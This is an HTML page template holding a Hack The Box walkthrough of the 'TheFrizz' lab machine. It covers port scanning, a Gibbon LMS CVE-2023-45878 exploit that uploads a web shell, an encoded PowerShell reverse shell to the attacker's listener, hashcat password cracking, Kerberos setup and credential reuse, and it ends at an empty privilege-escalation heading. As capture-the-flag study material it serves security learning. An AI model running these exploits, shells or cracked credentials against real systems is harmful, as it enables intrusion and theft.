@@ -1,0 +1,579 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB TheFrizz</h1>
+    <p class="text">Difficulty : Medium | UserDifficulty : 5.6</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+<div class="code-box"><pre><code>└─$ <u>sudo nmap -p- $IP --min-rate=10000</u>
+PORT      STATE SERVICE
+22/tcp    open  ssh
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+9389/tcp  open  adws
+49664/tcp open  unknown
+49668/tcp open  unknown
+49670/tcp open  unknown
+59392/tcp open  unknown
+59401/tcp open  unknown
+59431/tcp open  unknown</code></pre></div>
+
+    <div class="code-box"><pre><code>└─$ nmap -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49668,49670,59392,59401,59431 -sCV $IP --min-rate=10000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-14 02:48 EST
+Nmap scan report for frizz.htb (10.129.232.168)
+Host is up (0.13s latency).
+
+PORT      STATE SERVICE       VERSION
+22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
+|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
+|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-14 14:49:12Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+59392/tcp open  msrpc         Microsoft Windows RPC
+59401/tcp open  msrpc         Microsoft Windows RPC
+59431/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+
+
+
+<p class="text">There are http, ldap, ssh, and SMBports are open. It's interesting that the interconnection tools is ssh, not WinRM.</p>
+<div class="code-box"><pre><code>└─$ cat sep_tcp | grep frizz
+Nmap scan report for frizz.htb (10.129.232.168)
+|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)</code></pre></div>
+
+<p class="text">Also, we got domain name.</p>
+
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz]
+└─$ crackmapexec smb frizz.htb -u guest -p '' --shares -k
+SMB         frizz.htb       445    frizz.htb        [*]  x64 (name:frizz.htb) (domain:frizz.htb) (signing:True) (SMBv1:False)
+SMB         frizz.htb       445    frizz.htb        [-] frizz.htb\guest: KDC_ERR_CLIENT_REVOKED </code></pre></div>
+
+<p class="text">There is no low-hanging fruits.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/thefrizz/1.png' %}" alt="">
+    <p class="text">Also, there is a subdomain named '<u>frizzdc.frizz.htb</u>'. This would be the DC of the target.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/thefrizz/2.png' %}" alt="">
+    <p class="text">Pressing staff login button, I found the software version Gibbon v25. We may find vulnerability with this application.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/thefrizz/3.png' %}" alt="">
+    <p class="text">Simple google research returned CVE-2023-45878, which might lead reverse shell.</p>
+</div>
+
+<p class="text">Searching poc on google again, I found <a href="https://github.com/davidzzo23/CVE-2023-45878">this poc source</a>. Let's use this.</p>
+
+<div class="code-box"><pre><code>└─$ git clone https://github.com/davidzzo23/CVE-2023-45878.git
+└─$ cd CVE*
+└─$ python3 CVE-2023-45878.py
+usage: CVE-2023-45878.py [-h] -t TARGET [-c COMMAND] [-s] [-i IP] [-p PORT]
+CVE-2023-45878.py: error: the following arguments are required: -t/--target</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ python3 CVE-2023-45878.py -t frizzdc.frizz.htb -c "whoami" 
+[+] Uploading web shell as wxwmgkia.php...
+[+] Upload successful.
+[+] Executing command on: http://frizzdc.frizz.htb/Gibbon-LMS/wxwmgkia.php?cmd=whoami
+[+] Command output:
+frizz\w.webservice</code></pre></div>
+
+<p class="text">It was successful. Let's get reverse shell.</p>
+<p class="text">Grap reverse shell code from <a href="https://www.revshells.com/">revshell.com</a> and use it.</p>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444                                                    
+listening on [any] 4444 ...
+└─$ python3 CVE-2023-45878.py -t frizzdc.frizz.htb -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+
+
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.232.168] 56482
+whoami
+frizz\w.webservice
+PS C:\xampp\htdocs\Gibbon-LMS> </code></pre></div>
+
+<p class="text">We got w.webservice user.</p>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<div class="code-box"><pre><code>PS C:\xampp> dir
+
+
+    Directory: C:\xampp
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----        10/29/2024   7:25 AM                apache                                                               
+d-----        10/29/2024   7:26 AM                cgi-bin                                                              
+d-----        10/29/2024   7:25 AM                contrib                                                              
+d-----        10/29/2024   7:28 AM                htdocs                                                               
+d-----        10/29/2024   7:25 AM                licenses                                                             
+d-----        10/29/2024   7:25 AM                mysql                                                                
+d-----        10/29/2024   7:26 AM                php                                                                  
+d-----        10/29/2024   7:25 AM                src                                                                  
+d-----        11/14/2025  11:04 AM                tmp   </code></pre></div>
+
+<p class="text">Under the xampp directory, i found mysql. We can find mysql.exe under the mysql\bin. Let's use it and see if there is juicy info.</p>
+<div class="code-box"><pre><code>PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"
+Database
+gibbon
+information_schema
+test
+PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "show tables;"
+...
+gibbonpayment
+gibbonpermission
+<u>gibbonperson</u>
+gibbonpersonaldocument
+gibbonpersonaldocumenttype
+gibbonpersonmedical
+gibbonpersonmedicalcondition
+gibbonpersonmedicalconditionupdate
+gibbonpersonmedicalupdate
+gibbonpersonreset
+gibbonpersonstatuslog
+...</code></pre></div>
+
+<div class="code-box"><pre><code>PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "select username,passwordstrong,passwordstrongsalt from gibbonperson;"
+username        passwordstrong  passwordstrongsalt
+f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489
+PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "select * from gibbonperson;"
+gibbonPersonID  title   surname firstName       preferredName   officialName    nameInCharacters        gender  username        passwordStrong   passwordStrongSalt      passwordForceReset      status  canLogin        gibbonRoleIDPrimary     gibbonRoleIDAll dob      email   emailAlternate  image_240       lastIPAddress   lastTimestamp   lastFailIPAddress       lastFailTimestamp       failCount        address1        address1District        address1Country address2        address2District        address2Country phone1Type       phone1CountryCode       phone1  phone3Type      phone3CountryCode       phone3  phone2Type      phone2CountryCodephone2  phone4Type      phone4CountryCode       phone4  website languageFirst   languageSecond  languageThird   countryOfBirth  birthCertificateScan     ethnicity       religion        profession      employer        jobTitle        emergency1Name  emergency1Number1        emergency1Number2       emergency1Relationship  emergency2Name  emergency2Number1       emergency2Number2       emergency2Relationship   gibbonHouseID   studentID       dateStart       dateEnd gibbonSchoolYearIDClassOf       lastSchool      nextSchool       departureReason transport       transportNotes  calendarFeedPersonal    viewCalendarSchool      viewCalendarPersonal     viewCalendarSpaceBooking        gibbonApplicationFormID lockerNumber    vehicleRegistration     personalBackground      messengerLastRead        privacy dayType gibbonThemeIDPersonal   gibboni18nIDPersonal    studentAgreements       googleAPIRefreshToken    microsoftAPIRefreshToken        genericAPIRefreshToken  receiveNotificationEmails       mfaSecret       mfaToken        cookieConsent    fields
+0000000001      Ms.     Frizzle Fiona   Fiona   Fiona Frizzle           Unspecified     f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 /aACFhikmNopqrRTVz2489  N       Full    Y       001     001     NULL    f.frizzle@frizz.htb      NULL    NULL    ::1     2024-10-29 09:28:59     NULL    NULL    0                                                       NULL             NULL    NULL    NULL                                                    Y       Y       N       NULL            NULL     NULL    NULL    NULL    NULL    NULL   </code></pre></div>
+
+
+<div class="code-box"><pre><code>PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "select username,passwordstrong,passwordstrongsalt from gibbonperson;"
+username        passwordstrong  passwordstrongsalt
+f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489</code></pre></div>
+
+<p class="text">We found hashed user credential with salt string for f.frizzle user. Let's crack it!</p>
+<div class="code-box"><pre><code>└─$ hash-identifier                                      
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
+
+Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+
+Least Possible Hashs:
+[+] GOST R 34.11-94
+[+] RipeMD-256
+[+] SNEFRU-256
+[+] SHA-256(HMAC)
+[+] Haval-256(HMAC)
+[+] RipeMD-256(HMAC)
+[+] SNEFRU-256(HMAC)
+[+] SHA-256(md5($pass))
+[+] SHA-256(sha1($pass))
+--------------------------------------------------</code></pre></div>
+
+<p class="text">Using hash-identifier, I could determine hash type. The valid hash format for hashcat is <u>hash:salt</u>.</p>
+<div class="code-box"><pre><code>└─$ hashcat -h | grep sha256                             
+   1470 | sha256(utf16le($pass))                                     | Raw Hash
+   1410 | sha256($pass.$salt)                                        | Raw Hash salted and/or iterated
+   <u>1420</u> | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
+  22300 | sha256($salt.$pass.$salt)                                  | Raw Hash salted and/or iterated
+  20720 | sha256($salt.sha256($pass))                                | Raw Hash salted and/or iterated
+  21420 | sha256($salt.sha256_bin($pass))                            | Raw Hash salted and/or iterated
+   1440 | sha256($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
+  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
+  20710 | sha256(sha256($pass).$salt)                                | Raw Hash salted and/or iterated
+  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated
+   1430 | sha256(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
+   6400 | AIX {ssha256}                                              | Operating System
+   7400 | sha256crypt $5$, SHA256 (Unix)                             | Operating System
+   7401 | MySQL $A$ (sha256crypt)                                    | Database Server
+  20711 | AuthMe sha256                                              | Enterprise Application Software (EAS)
+  20300 | Python passlib pbkdf2-sha256                               | Framework</code></pre></div>
+
+  <p class="text">Since we have hash and salt, we need to indicate -m 1420.</p>
+<div class="code-box"><pre><code>└─$ echo '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489' > hash
+
+└─$ <u>hashcat hash /usr/share/wordlists/rockyou.txt -m 1420</u>
+...
+067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:<u>Jenni_Luvs_Magic23</u></code></pre></div>
+
+<p class="text">We successfully cracked the password! We need to check if the credential is valid one.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ <u>crackmapexec smb frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23'</u>
+SMB         frizzdc.frizz.htb 445    frizzdc.frizz.htb [*]  x64 (name:frizzdc.frizz.htb) (domain:frizzdc.frizz.htb) (signing:True) (SMBv1:False)
+SMB         frizzdc.frizz.htb 445    frizzdc.frizz.htb [-] frizzdc.frizz.htb\f.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED</code></pre></div>
+
+<p class="text">It returns <u>STATUS_NOT_SUPPORTED</u>. So, we might not use password authentication, but Kerberos authentication...</p>
+<p class="text">For that, we simply use -k flag for Kerberos authentication.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ <u>crackmapexec smb frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k</u>
+SMB         frizz.htb       445    frizz.htb        [*]  x64 (name:frizz.htb) (domain:frizz.htb) (signing:True) (SMBv1:False)
+SMB         frizz.htb       445    frizz.htb        [-] frizz.htb\f.frizzle: KRB_AP_ERR_SKEW </code></pre></div>
+
+<p class="text">This time, <u>KRB_AP_ERR_SKEW</u>. This means the time gap between me and the target machine is too long. Let's use faketime command to fix this problem.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ <u>sudo ntpdate frizz.htb</u>                                           
+[sudo] password for kali: 
+2025-11-14 15:13:44.027042 (-0500) +25200.849327 +/- 0.097058 frizz.htb 10.129.232.168 s1 no-leap
+CLOCK: time stepped by 25200.849327
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ <u>faketime '2025-11-14 15:13:44.027042' crackmapexec smb frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k</u>
+SMB         frizz.htb       445    frizz.htb        [*]  x64 (name:frizz.htb) (domain:frizz.htb) (signing:True) (SMBv1:False)
+SMB         frizz.htb       445    frizz.htb        [-] frizz.htb\f.frizzle: <u>KDC_ERR_S_PRINCIPAL_UNKNOWN</u> </code></pre></div>
+
+<p class="text">Not again!!!</p>
+<p class="text">The error says that the hostname is not correct. The crackmapexec need to authenticate the user with Kerberos, but it failded since the DC name is incorrect. </p>
+<p class="text">For instance, assume that we need to send mail to the company "ramdom.lnc"'s personel department. However, the command above sending random'lnc's ramdom lnc department.</p>
+<p class="text">Since the TGS is on frizzdc(machine namne), we need to request frizz.htb's frizzdc department. </p>
+<p class="text">For that, we need to specify domain name.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ <u>faketime '2025-11-14 15:35:38.268164' crackmapexec smb frizzdc -d frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k</u>
+SMB         frizzdc         445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False)
+SMB         frizzdc         445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23</u></code></pre></div>
+<p class="text">Yes! It's telling it's correct credential! Let's connect ssh.</p>
+<p class="text">※The /etc/hosts must be like this -> <u>10.129.232.168 frizzdc.frizz.htb frizz.htb frizzdc</u></p>
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ <u>sshpass -p 'Jenni_Luvs_Magic23' ssh f.frizzle@frizzdc.frizz.htb</u>
+f.frizzle@frizzdc.frizz.htb: Permission denied (gssapi-with-mic,keyboard-interactive).</code></pre></div>
+
+<p class="text">However, the request is denied. But we can confirm that the user f.frizzle has RemoteDesktop right using reverse shell we got before...</p>
+<div class="code-box"><pre><code>PS C:\xampp\mysql\bin> <u>net user f.frizzle</u>
+User name                    f.frizzle
+Full Name                    fiona frizzle
+Comment                      Wizard in Training
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/29/2024 6:27:03 AM
+Password expires             Never
+Password changeable          10/29/2024 6:27:03 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   11/14/2025 12:33:26 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *<u>Remote Management Use</u>
+Global Group memberships     *Domain Users         
+The command completed successfully.</code></pre></div>
+
+<p class="text">So, SSH must be usable for us.</p>
+<p class="text">Accourding to the outout before we met, we might need to get ticket from Kerberos to use ssh. To do that, we can use <u>nxc</u>.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ <u>faketime '2025-11-14 15:43:01.425486' nxc smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file krb5.conf</u>
+SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                                        
+SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
+
+└─$ <u>sudo cp krb5.conf /etc/krb5.conf</u></code></pre></div>
+
+<p class="text">Then, I can get ticket as f.frizzle to use SSH.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ <u>kinit f.frizzle</u> 
+Password for f.frizzle@FRIZZ.HTB: 
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ <u>klist</u>          
+Default principal: f.frizzle@FRIZZ.HTB
+
+Valid starting       Expires              Service principal
+11/14/2025 15:47:59  11/15/2025 01:47:59  krbtgt/FRIZZ.HTB@FRIZZ.HTB
+        renew until 11/15/2025 15:47:47</code></pre></div>
+
+        <p class="text">Finally we can use ssh...</p>
+
+        <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ ssh -k f.frizzle@frizzdc.frizz.htb   
+PowerShell 7.4.5
+PS C:\Users\f.frizzle> </code></pre></div>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<div class="code-box"><pre><code>PS C:\> ls -force
+
+    Directory: C:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d--hs          10/29/2024  7:31 AM                <u>$RECYCLE.BIN</u>
+d--h-           3/10/2025  3:31 PM                $WinREAgent
+d--hs           7/24/2025 12:41 PM                Config.Msi
+l--hs          10/29/2024  9:12 AM                Documents and Settings -> C:\Users
+d----           3/10/2025  3:39 PM                inetpub
+d----            5/8/2021  1:15 AM                PerfLogs
+d-r--           7/24/2025 12:41 PM                Program Files
+d----            5/8/2021  2:34 AM                Program Files (x86)
+d--h-           2/20/2025  2:50 PM                ProgramData
+d--hs          10/29/2024  9:12 AM                Recovery
+d--hs          10/29/2024  7:25 AM                System Volume Information
+d-r--          10/29/2024  7:31 AM                Users
+d----           3/10/2025  3:41 PM                Windows
+d----          10/29/2024  7:28 AM                xampp
+-a-hs          10/29/2024  8:27 AM          12288 DumpStack.log.tmp
+
+PS C:\></code></pre></div>
+
+<p class="text">Under the root dir, I found $RECYCLE.BIN folder which is hidden.</p>
+
+<div class="code-box"><pre><code>PS C:\> cd '$RECYCLE.BIN'
+PS C:\$RECYCLE.BIN> ls -force   
+
+    Directory: C:\$RECYCLE.BIN
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103</code></pre></div>
+<p class="text">And found SID.</p>
+
+<div class="code-box"><pre><code>PS C:\$RECYCLE.BIN> ls -force   
+
+    Directory: C:\$RECYCLE.BIN
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103
+
+PS C:\$RECYCLE.BIN> cd S-1-5-21-2386970044-1145388522-2932701813-1103
+PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> ls -force
+
+    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
+-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
+-a-hs          10/29/2024  7:31 AM            129 desktop.ini</code></pre></div>
+<p class="text">Inside the dir, I found 7z file. Let's open this and analyze it on our localhost.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' re2xmeg.7z           
+$RE2XMEG.7z                                                                                    100%   29MB 549.6KB/s   00:54 </code></pre></div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ <u>7z x re2xmeg.7z</u>          
+
+7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
+ 64-bit locale=en_US.UTF-8 Threads:5 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 30416987 bytes (30 MiB)
+
+Extracting archive: re2xmeg.7z
+--
+Path = re2xmeg.7z
+Type = 7z
+Physical Size = 30416987
+Headers Size = 65880
+Method = ARM64 LZMA2:26 LZMA:20 BCJ2
+Solid = +
+Blocks = 3
+
+Everything is Ok                
+
+Folders: 684
+Files: 5384
+Size:       141187501
+Compressed: 30416987
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ ls
+a  base64  CVE-2023-45878.py  hash  krb5.conf  lookupsids  re2xmeg.7z  README.md  <u>wapt</u></code></pre></div>
+<p class="text">Wapt folder was inflated.</p>
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/…/thefrizz/CVE-2023-45878/wapt/conf]
+└─$ cat waptserver.ini
+[options]
+allow_unauthenticated_registration = True
+wads_enable = True
+login_on_wads = True
+waptwua_enable = True
+secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
+server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
+token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
+wapt_password = <u>IXN1QmNpZ0BNZWhUZWQhUgo=</u>
+clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
+clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt
+
+[tftpserver]
+root_dir = c:\wapt\waptserver\repository\wads\pxe
+log_path = c:\wapt\log</code></pre></div>
+<p class="text">Under the conf folder, I found init file and it stores wapt_password. It smell like base64.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/…/thefrizz/CVE-2023-45878/wapt/conf]
+└─$ echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d
+!suBcig@MehTed!R</code></pre></div>
+
+<p class="text">And base64 successfully decoded it. </p>
+
+<div class="code-box"><pre><code>PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> dir C:\users
+
+    Directory: C:\Users
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d----           3/11/2025  3:37 PM                Administrator
+d----          10/29/2024  7:27 AM                f.frizzle
+d----          10/29/2024  7:31 AM                <u>M.SchoolBus</u>
+d-r--          10/29/2024  7:13 AM                Public
+d----           2/19/2025  1:35 PM                <u>v.frizzle</u>
+d----           2/19/2025  1:35 PM                w.Webservice</code></pre></div>
+<p class="text">Since the M.SchoolBus and v.frizzle users are there, the plain text password might be one of their passowrd...</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/…/thefrizz/CVE-2023-45878/wapt/conf]
+└─$ faketime '2025-11-14 16:01:10.912588' nxc smb frizzdc.frizz.htb -u m.schoolbus -p '!suBcig@MehTed!R' -k
+SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                                        
+SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\m.schoolbus:!suBcig@MehTed!R</code></pre></div>
+<p class="text">And yeah, it was for m.schoolbus user.</p>
+<p class="text">Let's request Kerberos to use ssh like before.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/…/thefrizz/CVE-2023-45878/wapt/conf]
+└─$  kinit m.schoolbus
+Password for m.schoolbus@FRIZZ.HTB: 
+                                                                                                                                 
+┌──(kali㉿kali)-[~/…/thefrizz/CVE-2023-45878/wapt/conf]
+└─$ klist
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: m.schoolbus@FRIZZ.HTB
+
+Valid starting       Expires              Service principal
+11/14/2025 16:03:00  11/15/2025 02:03:00  krbtgt/FRIZZ.HTB@FRIZZ.HTB
+        renew until 11/15/2025 16:02:53</code></pre></div>
+
+        <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/thefrizz/CVE-2023-45878]
+└─$ ssh -k m.schoolbus@frizzdc.frizz.htb
+PowerShell 7.4.5
+PS C:\Users\M.SchoolBus> </code></pre></div>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
